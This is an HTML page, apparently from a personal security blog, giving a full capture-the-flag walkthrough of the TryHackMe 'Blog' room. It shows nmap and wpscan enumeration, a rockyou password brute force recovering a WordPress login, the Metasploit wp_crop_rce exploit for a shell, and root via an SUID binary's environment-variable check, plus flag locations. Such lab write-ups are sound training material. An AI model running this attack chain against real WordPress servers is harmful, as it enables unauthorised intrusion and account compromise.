@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Blog Walkthrough | 0xb0ug44</title>
+  <link rel="stylesheet" href="../css/style.css" />
+  <link rel="stylesheet" href="../css/terminal.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600&display=swap" rel="stylesheet" />
+</head>
+<body>
+  <div class="scanlines" aria-hidden="true"></div>
+
+  <nav class="nav" id="nav">
+    <div class="nav-logo">
+      <a href="../index.html" style="text-decoration:none;color:inherit">
+        <span class="nav-logo-bracket">[</span>
+        <span class="nav-logo-text">0xb0ug44</span>
+        <span class="nav-logo-bracket">]</span>
+        <span class="nav-cursor">_</span>
+      </a>
+    </div>
+    <ul class="nav-links">
+      <li><a href="../index.html" class="nav-link">← Back</a></li>
+      <li><a href="index.html" class="nav-link" style="color:var(--green)">All Write-ups</a></li>
+    </ul>
+  </nav>
+
+  <div class="article-header">
+    <div class="container">
+      <div class="blog-meta" style="margin-bottom:1rem">
+        <span class="blog-category cat-web">Lab Walkthrough</span>
+        <span class="blog-date">April 15, 2026</span>
+      </div>
+      <h1 style="font-family:var(--font-display);font-size:clamp(1.5rem,3.5vw,2.2rem);font-weight:700;letter-spacing:2px;margin-bottom:1rem;line-height:1.3;max-width:800px;">
+        Blog TryHackMe Walkthrough: From WordPress to Root
+      </h1>
+      <div style="display:flex;gap:1rem;align-items:center;flex-wrap:wrap">
+        <div style="display:flex;align-items:center;gap:0.5rem">
+          <div style="width:32px;height:32px;border-radius:50%;background:var(--green-glow);border:1px solid var(--green);display:flex;align-items:center;justify-content:center;font-size:0.8rem;color:var(--green)">MY</div>
+          <span style="font-family:var(--font-mono);font-size:0.8rem;color:var(--text-secondary)">Mohamed Yassine Bougamra</span>
+        </div>
+        <div class="blog-tags-row">
+          <span class="btag">TryHackMe</span>
+          <span class="btag">WordPress</span>
+          <span class="btag">Metasploit</span>
+          <span class="btag">Privilege Escalation</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <main class="article-content" style="z-index:2;position:relative;">
+    <div style="background:rgba(255,204,0,0.06);border:1px solid rgba(255,204,0,0.2);border-radius:4px;padding:1rem 1.25rem;margin-bottom:2rem;font-family:var(--font-mono);font-size:0.82rem;color:#ffcc00;">
+      ⚠️ Spoiler warning: this post contains the complete solution for the Blog room. Try the room yourself first if you want to solve it without hints.
+    </div>
+
+    <p>Blog is a medium-difficulty TryHackMe room built around careful enumeration. The target initially looks like a small WordPress site, but the useful path comes from connecting several clues: exposed services, WordPress users, a weak password, a vulnerable CMS version, and a custom SUID binary.</p>
+
+    <p>If you want to try the room yourself, you can access it on <a href="https://tryhackme.com/room/blog" target="_blank" rel="noopener noreferrer" style="color:var(--green)">TryHackMe: Blog</a>. Replace <code>&lt;target-ip&gt;</code> with the address assigned to your machine.</p>
+
+    <h2>Step 1: Enumerating the Attack Surface</h2>
+    <p>I began with a version and default-script scan to identify the services exposed by the target.</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>recon.sh</span><span>nmap</span></div>
+      <pre><code>nmap -sC -sV &lt;target-ip&gt;</code></pre>
+    </div>
+
+    <p>The scan revealed SSH, HTTP, and SMB-related ports. SSH did not provide a starting point because no credentials were available, so I focused on the web service and the hostname it expected.</p>
+    <figure class="article-figure">
+      <img src="images/blog-01.png" alt="Nmap scan showing SSH, HTTP, and SMB services on the Blog room target" loading="lazy" />
+    </figure>
+
+    <h2>Step 2: Discovering the WordPress Application</h2>
+    <p>The site behaved differently when accessed through its configured hostname. I mapped the target locally before continuing with web enumeration.</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>hosts.txt</span><span>dns</span></div>
+      <pre><code>&lt;target-ip&gt; blog.thm</code></pre>
+    </div>
+    <figure class="article-figure">
+      <img src="images/blog-02.png" alt="Adding blog.thm to the local hosts file" loading="lazy" />
+    </figure>
+<p>After adding the IP address of the target machine with the blog.thm in the hosts file, we tried to enumerate the web page by opening it in a Browser</p>
+    <p>Opening <code>http://blog.thm/</code> showed a WordPress installation. This answered the room's CMS question and gave me a clear direction for the next stage.</p>
+    <figure class="article-figure">
+      <img src="images/blog-03.png" alt="WordPress site running on blog.thm" loading="lazy" />
+    </figure>
+    <figure class="article-figure">
+      <img src="images/blog-wordpress-proof.png" alt="Wappalyzer identifying WordPress 5.0 on the Blog room website" loading="lazy" />
+    </figure>
+
+    <h2>Step 3: Enumerating WordPress Users</h2>
+    <p>I used WPScan to identify the WordPress version, usernames, and other publicly visible details.</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>wordpress-enum.sh</span><span>wpscan</span></div>
+      <pre><code>wpscan --url http://blog.thm/ -e u,vp,vt</code></pre>
+    </div>
+
+    <p>The enumeration exposed the usernames <code>kwheel</code>, <code>bjoel</code>, <code>Karen Wheeler</code>, and <code>Billy Joel</code>. I placed the discovered names in a small local file so the credential test remained focused instead of using an unnecessarily broad username list.</p>
+
+
+    <div class="codeblock">
+      <div class="bar"><span>users.txt</span><span>wordlist</span></div>
+      <pre><code>kwheel
+bjoel
+Karen Wheeler
+Billy Joel</code></pre>
+    </div>
+
+
+    <h2>Step 4: Recovering WordPress Credentials</h2>
+    <p>The room permits a password audit through the WordPress XML-RPC functionality. I tested the known users against the supplied wordlist with WPScan.</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>password-audit.sh</span><span>wpscan</span></div>
+      <pre><code>wpscan --url http://blog.thm/ -U users.txt -P /usr/share/wordlists/rockyou.txt</code></pre>
+    </div>
+
+    <p>The audit recovered credentials for <code>kwheel</code>: <code>cutiepie1</code>. This also confirmed that XML-RPC was enabled and accepting the password audit.</p>
+
+    <figure class="article-figure">
+      <img src="images/blog-08.png" alt="Recovered WordPress credentials for kwheel" loading="lazy" />
+    </figure>
+
+    <h2>Step 5: Getting a Web Shell</h2>
+    <p>The WordPress version in the room is vulnerable to a remote command execution issue. With the recovered account, I used the corresponding Metasploit module and configured the target host and WordPress credentials.</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>metasploit.rc</span><span>msfconsole</span></div>
+      <pre><code>use exploit/multi/http/wp_crop_rce
+set RHOSTS &lt;target-ip&gt;
+set USERNAME kwheel
+set PASSWORD cutiepie1
+run</code></pre>
+    </div>
+
+    <p>The room uses WordPress <code>5.0</code>, which is the version relevant to the exploit. The exploit opened a Meterpreter session as <code>www-data</code>. I converted it to a regular shell and upgraded the terminal so subsequent commands behaved predictably.</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>shell-upgrade.sh</span><span>linux</span></div>
+      <pre><code>shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+id</code></pre>
+    </div>
+    <figure class="article-figure">
+      <img src="images/blog-09.png" alt="Meterpreter shell converted to a www-data terminal" loading="lazy" />
+    </figure>
+
+    <h2>Step 6: Investigating the User Files</h2>
+    <p>While checking the home directories, I found a decoy <code>user.txt</code> and a termination PDF belonging to the <code>bjoel</code> account. The document contained a clue related to Rubber Ducky Inc, which became useful when locating the real flag later.</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>user-enum.sh</span><span>shell</span></div>
+      <pre><code>cd /home/bjoel
+ls -la
+cat user.txt
+download /home/bjoel/Billy_Joel_Termination_May20-2020.pdf</code></pre>
+    </div>
+
+
+    <p>The document explained that Billy Joel had worked for Rubber Ducky Inc. The clue pointed toward the USB-mounted directory, but I still needed root privileges before I could read the real flag there.</p>
+
+    <h2>Step 7: Analyzing the SUID Checker</h2>
+    <p>I searched for SUID binaries owned by root and found a custom executable at <code>/usr/sbin/checker</code>.</p>
+
+    <div class="codeblock">
+      <div class="bar"><span>suid-enum.sh</span><span>privilege-escalation</span></div>
+      <pre><code>find / -perm -u=s -type f 2&gt;/dev/null
+/usr/sbin/checker</code></pre>
+    </div>
+    <figure class="article-figure">
+      <img src="images/blog-12.png" alt="Finding the custom checker SUID binary" loading="lazy" />
+    </figure>
+
+    <p>Running the binary normally returned a message indicating that the current user was not an administrator. I transferred the executable for local analysis and confirmed that it checks for an environment variable named <code>admin</code>. When that variable is present, the SUID program launches a shell with its elevated privileges.</p>
+    <figure class="article-figure">
+      <img src="images/blog-14.png" alt="Reverse-engineering the checker binary" loading="lazy" />
+    </figure>
+    <figure class="article-figure">
+      <img src="images/blog-15.png" alt="Checker binary logic showing the admin environment-variable check" loading="lazy" />
+    </figure>
+
+    <div class="codeblock">
+      <div class="bar"><span>root-shell.sh</span><span>privilege-escalation</span></div>
+      <pre><code>export admin=true
+/usr/sbin/checker
+whoami
+cat /root/root.txt
+find / -name user.txt 2&gt;/dev/null
+cat /media/usb/user.txt</code></pre>
+    </div>
+
+    <p>The resulting shell ran as root. I then searched the filesystem for the real user flag and found it under <code>/media/usb/</code>, while the root flag was in the usual root home directory. The <code>/home/bjoel/user.txt</code> file was a decoy.</p>
+
+    <h2>Key Takeaways</h2>
+    <ul>
+      <li>Hostname-based virtual hosting can hide the intended application during initial enumeration.</li>
+      <li>WordPress user enumeration can turn a large password search into a targeted audit.</li>
+      <li>CMS version and plugin research matters after valid credentials are recovered.</li>
+      <li>Custom SUID binaries deserve both runtime testing and local reverse engineering.</li>
+      <li>Decoy files can still contain useful context even when they are not the final flag.</li>
+    </ul>
+  </main>
+
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-bottom" style="border-top:none;padding-top:0">
+        <p>© 2026 Mohamed Yassine Bougamra · <a href="index.html" style="color:var(--green)">← Back to Write-ups</a></p>
+        <p class="footer-ascii">/* enumerate first, exploit second */</p>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../js/main.js"></script>
+</body>
+</html>
